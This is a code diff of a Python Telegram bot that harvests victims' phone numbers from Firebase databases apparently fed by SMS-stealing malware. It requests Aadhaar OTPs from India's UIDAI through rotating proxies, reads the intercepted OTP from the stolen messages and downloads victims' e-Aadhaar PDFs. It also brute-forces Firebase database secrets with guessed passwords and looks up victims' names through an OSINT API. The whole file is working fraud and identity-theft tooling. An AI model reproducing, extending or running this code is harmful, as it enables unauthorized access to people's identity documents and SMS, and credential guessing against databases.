@@ -1,8 +1,9 @@
 """
 ╔══════════════════════════════════════════════════╗
-║          AUTO-OTP BOT v1.4                       ║
+║          AUTO-OTP BOT v1.5                       ║
 ║   Firebase → Auto Number → Auto OTP → PDF Drop   ║
-║   + Proxy Pool (proxies.txt)                     ║
+║   + Direct Firebase reads (no proxy)             ║
+║   + Proxied UIDAI calls (proxies.txt)            ║
 ║   + Detection ported from goplay.py (proven)     ║
 ╚══════════════════════════════════════════════════╝
 
@@ -54,13 +55,13 @@ BOT_NAME = "⚡ Auto-OTP Bot"
 DIVIDER = "━━━━━━━━━━━━━━━"
 NAME_API = "https://sarkariupdate.online/osint/APIX.php?api=num_api&q="
 
-# Verbose skip logging (turn off in production by setting to False)
+# Verbose skip logging — set False in production once detection verified
 DEBUG_SKIP = True
 
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 logger = logging.getLogger("AutoOTP")
 
-# ============== PROXY POOL ==============
+# ============== PROXY POOL (UIDAI ONLY) ==============
 PROXY_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "proxies.txt")
 PROXY_POOL = []
 _bad_proxies = set()
@@ -159,7 +160,7 @@ def get_fp():
         'dnt': str(random.choice([0, 1])),
     }
 
-# ============== PROXIED SESSION ==============
+# ============== PROXIED SESSION (UIDAI ONLY) ==============
 def get_sess():
     s = requests.Session()
     s.mount('https://', requests.adapters.HTTPAdapter(
@@ -176,7 +177,7 @@ def _is_proxy_error(e):
 def _should_kill_proxy(status):
     return status in (403, 407, 429, 502, 503, 504)
 
-# ============== TELEGRAM ==============
+# ============== TELEGRAM (direct) ==============
 def tg():
     global _tg_session
     if not _tg_session:
@@ -227,7 +228,7 @@ def get_updates(offset=None):
         time.sleep(5)
     return []
 
-# ============== UIDAI ==============
+# ============== UIDAI (proxied) ==============
 BH = {
     'Accept': 'application/json, text/plain, */*',
     'Accept-Language': 'en_IN',
@@ -417,33 +418,16 @@ def dl_pdf(eid, otp, otxn, tid):
         return False, str(e)
 
 # ============================================================
-# 🧠 DEVICE DETECTION — exact port from goplay.py (proven)
+# 🧠 DEVICE DETECTION — direct Firebase reads (no proxy)
+#    Logic ported 1:1 from goplay.py (proven working)
 # ============================================================
-# goplay scans these keys anywhere in the node (case-insensitive substring)
 PHONE_TARGET_KEYS = ["phone", "phonenumber", "mobno", "mobile", "number", "num", "to"]
 
-def _extract_phones_from_node(node):
-    """
-    Return set of valid +91XXXXXXXXXX phones found in this client node.
-    EXACT logic from goplay.py get_client_stats().
-    """
-    found = set()
-    for k, v in node.items():
-        if any(tk in k.lower() for tk in PHONE_TARGET_KEYS) and isinstance(v, (str, int)):
-            val_str = str(v).strip()
-            clean_digits = re.sub(r'[^0-9]', '', val_str)
-            if len(clean_digits) >= 10:
-                last_10 = clean_digits[-10:]
-                if re.match(r'^[6-9]\d{9}$', last_10):
-                    found.add("+91" + last_10)
-    return found
-
 def _to_aad_format(phone_with_cc):
-    """Convert '+91XXXXXXXXXX' → 'XXXXXXXXXX' (bare 10 digits, used by UIDAI APIs)."""
+    """Convert '+91XXXXXXXXXX' → 'XXXXXXXXXX' (UIDAI expects bare 10 digits)."""
     d = re.sub(r'[^0-9]', '', str(phone_with_cc))
     return d[-10:] if len(d) >= 10 else None
 
-# ============== FIREBASE ==============
 def _fb_url(url, auth, path):
     u = f"{url}/{path}"
     if auth:
@@ -454,11 +438,11 @@ def _fb_url(url, auth, path):
 def fb_scan():
     """
     Scan every registered Firebase DB and return online devices.
-
-    This is a 1:1 port of goplay.py's get_client_stats():
+    Uses DIRECT requests (no proxy) — Firebase reads work from datacenter IPs.
+    Detection logic = exact port of goplay.py's get_client_stats():
       1. active ⇔ status is True / 'true' / 1
-      2. skip anonymous '-xxx' nodes that have neither battery nor status
-      3. extract phone from any key containing phone/mobno/mobile/number/num/to
+      2. skip anonymous '-xxx' nodes (no battery, no status)
+      3. phone extracted from any key containing phone/mobno/mobile/number/num/to
       4. validate last 10 digits against ^[6-9]\\d{9}$
       5. dedupe across the whole scan
     """
@@ -471,20 +455,17 @@ def fb_scan():
         logger.info(f"🔍 fb_scan: scanning {len(dbs)} DB(s)")
 
     for db in dbs:
-        s = None
         try:
-            s = get_sess()
-            r = s.get(_fb_url(db["url"], db["auth"], "clients.json"), timeout=10)
+            url = _fb_url(db["url"], db["auth"], "clients.json")
+            if DEBUG_SKIP:
+                logger.info(f"→ GET {url}")
+            r = requests.get(url, timeout=15)
             if r.status_code != 200:
-                if _should_kill_proxy(r.status_code):
-                    mark_bad_proxy(getattr(s, '_proxy_url', None))
-                if DEBUG_SKIP:
-                    logger.info(f"⚠️ {db['url']} → HTTP {r.status_code}")
+                logger.warning(f"⚠️ {db['url']} → HTTP {r.status_code}")
                 continue
             data = r.json()
             if not data or not isinstance(data, dict):
-                if DEBUG_SKIP:
-                    logger.info(f"⚠️ {db['url']} → empty or non-dict")
+                logger.info(f"⚠️ {db['url']} → empty or non-dict (got {type(data).__name__})")
                 continue
 
             if DEBUG_SKIP:
@@ -498,7 +479,7 @@ def fb_scan():
                 if not isinstance(node, dict):
                     continue
 
-                # ── goplay's anonymous node filter ──
+                # goplay's anonymous-node filter
                 if (str(device_id).startswith("-")
                         and len(str(device_id)) > 10
                         and not node.get("battery")
@@ -517,7 +498,7 @@ def fb_scan():
                         logger.info(f"⚪ skip {device_id[:14]}… → status={status_val!r}")
                     continue
 
-                # ── extract phone(s) exactly like goplay ──
+                # ── extract phones — exact goplay scan ──
                 device_phones = set()
                 for k, v in node.items():
                     if any(tk in k.lower() for tk in PHONE_TARGET_KEYS) and isinstance(v, (str, int)):
@@ -531,11 +512,10 @@ def fb_scan():
                 if not device_phones:
                     offline_count += 1
                     if DEBUG_SKIP:
-                        logger.info(f"⚪ skip {device_id[:14]}… → status=true but no phone key found")
+                        logger.info(f"⚪ skip {device_id[:14]}… → status=true but no phone key")
                     continue
 
-                # ── add each phone (dedupe across scan) ──
-                added_for_this_device = False
+                added_for_device = False
                 for p_cc in device_phones:
                     aad_phone = _to_aad_format(p_cc)
                     if not aad_phone:
@@ -548,7 +528,7 @@ def fb_scan():
                                 logger.info(f"⚪ skip {aad_phone} → already used")
                             continue
                     seen_phones.add(aad_phone)
-                    added_for_this_device = True
+                    added_for_device = True
                     devs.append({
                         "db_url": db["url"],
                         "db_auth": db["auth"],
@@ -558,49 +538,44 @@ def fb_scan():
                         "battery": str(node.get("battery", "?"))[:6],
                     })
 
-                if added_for_this_device:
+                if added_for_device:
                     online_count += 1
                 else:
                     offline_count += 1
 
-            if DEBUG_SKIP:
-                logger.info(f"📊 {db['url']} → total={total_count} online={online_count} offline={offline_count}")
+            logger.info(f"📊 {db['url']} → total={total_count} online={online_count} offline={offline_count}")
 
+        except requests.exceptions.Timeout:
+            logger.warning(f"⏱️ {db['url']} → timeout (direct request)")
+        except requests.exceptions.ConnectionError as e:
+            logger.warning(f"❌ {db['url']} → connection error: {e}")
         except Exception as e:
-            if s is not None and _is_proxy_error(e):
-                mark_bad_proxy(getattr(s, '_proxy_url', None))
-            logger.warning(f"fb_scan error on {db['url']}: {e}")
+            logger.warning(f"fb_scan error on {db['url']}: {type(e).__name__}: {e}")
             continue
 
-    if DEBUG_SKIP:
-        logger.info(f"✅ fb_scan: {len(devs)} online device(s) found")
+    logger.info(f"✅ fb_scan: {len(devs)} online device(s) found")
     return devs
 
 def fb_msgids(url, auth, did):
-    s = None
+    """Direct Firebase read — no proxy."""
     try:
-        s = get_sess()
         u = _fb_url(url, auth, f"messages/{did}.json")
         u += ("&" if "?" in u else "?") + "shallow=true"
-        r = s.get(u, timeout=8)
+        r = requests.get(u, timeout=10)
         if r.status_code == 200 and r.json():
             return set(r.json().keys())
-        if _should_kill_proxy(r.status_code):
-            mark_bad_proxy(getattr(s, '_proxy_url', None))
     except Exception as e:
-        if s is not None and _is_proxy_error(e):
-            mark_bad_proxy(getattr(s, '_proxy_url', None))
+        logger.warning(f"fb_msgids error: {e}")
     return set()
 
 def fb_otp(url, auth, did, existing, timeout=120):
+    """Direct Firebase read — no proxy."""
     t0 = time.time()
     while time.time() - t0 < timeout:
-        s = None
         try:
-            s = get_sess()
             u = _fb_url(url, auth, f"messages/{did}.json")
             u += ("&" if "?" in u else "?") + 'orderBy=%22%24key%22&limitToLast=20'
-            r = s.get(u, timeout=8)
+            r = requests.get(u, timeout=10)
             if r.status_code == 200 and r.json():
                 ms = r.json()
                 if isinstance(ms, dict):
@@ -613,11 +588,8 @@ def fb_otp(url, auth, did, existing, timeout=120):
                         for o in re.findall(r'\b(\d{6})\b', body):
                             if o not in ["000000", "123456", "111111", "999999"]:
                                 return o
-            elif _should_kill_proxy(r.status_code):
-                mark_bad_proxy(getattr(s, '_proxy_url', None))
-        except Exception as e:
-            if s is not None and _is_proxy_error(e):
-                mark_bad_proxy(getattr(s, '_proxy_url', None))
+        except Exception:
+            pass
         time.sleep(3)
     return None
 
@@ -639,7 +611,8 @@ def auto_worker(cid, count):
                   f"◈  Proxies · {total_p}\n<i>◌  Scanning...</i>")
     devs = fb_scan()
     if not devs:
-        send_msg(cid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✗  No online devices.")
+        send_msg(cid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✗  No online devices.\n"
+                      f"<i>Check Railway logs for skip reasons</i>")
         auto_running.pop(cid, None)
         return
 
@@ -663,21 +636,16 @@ def auto_worker(cid, count):
                           f"<i>◌ Fetching name...</i>")
         mid = m.get('result', {}).get('message_id')
 
-        # Name lookup
+        # Name lookup — DIRECT (no proxy)
         name = "MR"
-        s = None
         try:
-            s = get_sess()
-            r = s.get(f"{NAME_API}{mob}", timeout=8)
+            r = requests.get(f"{NAME_API}{mob}", timeout=10)
             if r.status_code == 200:
                 fn = r.json().get('name', '').strip()
                 if fn and fn.lower() not in ['unknown', 'n/a', '']:
                     name = fn.upper()
-            elif _should_kill_proxy(r.status_code):
-                mark_bad_proxy(getattr(s, '_proxy_url', None))
-        except Exception as e:
-            if s is not None and _is_proxy_error(e):
-                mark_bad_proxy(getattr(s, '_proxy_url', None))
+        except Exception:
+            pass
 
         if mid:
             edit_msg(cid, mid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>〔 #{done} 〕</b> "
@@ -845,7 +813,7 @@ def handle(cid, text):
     elif cmd == '/addfire':
         if len(parts) < 2:
             send_msg(cid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✗ Usage:\n<code>/addfire URL:AUTH</code>\n\n"
-                          f"Or just URLs (auto-tests auth):\n<code>/addfire\nURL1\nURL2</code>")
+                          f"Or just URLs:\n<code>/addfire\nURL1\nURL2</code>")
             return
         raw = parts[1].strip()
         lines = [l.strip() for l in raw.split('\n') if l.strip()]
@@ -886,36 +854,26 @@ def handle(cid, text):
                 test_auths = ["123456", "Very", "test", "737374", "373747", "1234", "admin", "12345"]
                 found = False
                 for ta in test_auths:
-                    s = None
                     try:
-                        s = get_sess()
-                        r = s.get(f"{url}/clients.json?auth={ta}", timeout=6)
+                        r = requests.get(f"{url}/clients.json?auth={ta}", timeout=6)
                         if r.status_code == 200:
                             with firebase_lock:
                                 firebase_dbs.append({"url": url, "auth": ta})
                             added += 1
                             found = True
                             break
-                        if _should_kill_proxy(r.status_code):
-                            mark_bad_proxy(getattr(s, '_proxy_url', None))
-                    except Exception as e:
-                        if s is not None and _is_proxy_error(e):
-                            mark_bad_proxy(getattr(s, '_proxy_url', None))
+                    except Exception:
+                        continue
                 if not found:
-                    s = None
                     try:
-                        s = get_sess()
-                        r = s.get(f"{url}/clients.json", timeout=6)
+                        r = requests.get(f"{url}/clients.json", timeout=6)
                         if r.status_code == 200:
                             with firebase_lock:
                                 firebase_dbs.append({"url": url, "auth": ""})
                             added += 1
                             found = True
-                        elif _should_kill_proxy(r.status_code):
-                            mark_bad_proxy(getattr(s, '_proxy_url', None))
-                    except Exception as e:
-                        if s is not None and _is_proxy_error(e):
-                            mark_bad_proxy(getattr(s, '_proxy_url', None))
+                    except Exception:
+                        pass
                 if not found:
                     need_auth.append(url)
 
@@ -980,7 +938,8 @@ def handle(cid, text):
         send_msg(cid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<i>◌ Scanning...</i>")
         devs = fb_scan()
         if not devs:
-            send_msg(cid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✗ No online devices.")
+            send_msg(cid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✗ No online devices.\n"
+                          f"<i>Check Railway logs for skip reasons</i>")
             return
         ls = [f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>📱 Online Devices</b>\n"]
         for i, d in enumerate(devs[:50], 1):
@@ -1024,7 +983,8 @@ def handle(cid, text):
                       f"◈ Used · {uc}\n"
                       f"◈ Running · {ar}\n"
                       f"◈ Proxies · {total_p - bad_p}/{total_p} healthy\n"
-                      f"◈ OCR · {'✓' if ocr_solver else '✗'}")
+                      f"◈ OCR · {'✓' if ocr_solver else '✗'}\n"
+                      f"◈ Firebase reads · direct (no proxy)")
 
 # ============== MAIN ==============
 def main():
@@ -1033,7 +993,7 @@ def main():
     print("=" * 50)
     load_proxies()
     total_p, _ = proxy_stats()
-    print(f"  Proxies loaded: {total_p}")
+    print(f"  Proxies loaded: {total_p} (used for UIDAI only)")
     try:
         r = tg().get(f"https://api.telegram.org/bot{BOT_TOKEN}/getMe", timeout=10).json()
         if r.get('ok'):
